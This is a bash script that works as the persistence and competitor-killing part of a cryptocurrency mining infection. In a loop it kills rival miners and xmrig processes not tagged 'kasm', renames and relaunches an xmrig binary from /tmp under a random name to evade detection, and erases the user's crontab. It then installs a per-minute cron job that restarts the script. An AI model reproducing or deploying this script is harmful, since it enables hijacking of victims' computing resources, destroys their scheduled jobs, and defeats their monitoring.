#!/bin/bash
my_miner="kasm"

while true; do
    pkill -f minerd
    pkill -f crypto
    pkill -f nicehash
    pkill -f nanopool
    pkill -f supportxmr
    pkill -f moneroocean
    pkill -f 75.119.158.0:3333
    pkill -f "xmrig.*config.json"

    for pid in $(pgrep -f xmrig); do
        pname=$(ps -p $pid -o args=)
        if [[ "$pname" != *"$my_miner"* ]]; then
            kill -9 $pid
        fi
    done

    randname=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 10 | head -n 1)
    mv /tmp/xmrig/xmrig-6.22.2/xmrig /tmp/xmrig/xmrig-6.22.2/$randname
    chmod +x /tmp/xmrig/xmrig-6.22.2/$randname
    nohup /tmp/xmrig/xmrig-6.22.2/$randname > /dev/null 2>&1 &

    crontab -r
    echo "* * * * * nohup bash /tmp/anti-killer.sh > /dev/null 2>&1 &" | crontab -

    sleep 0.1
done
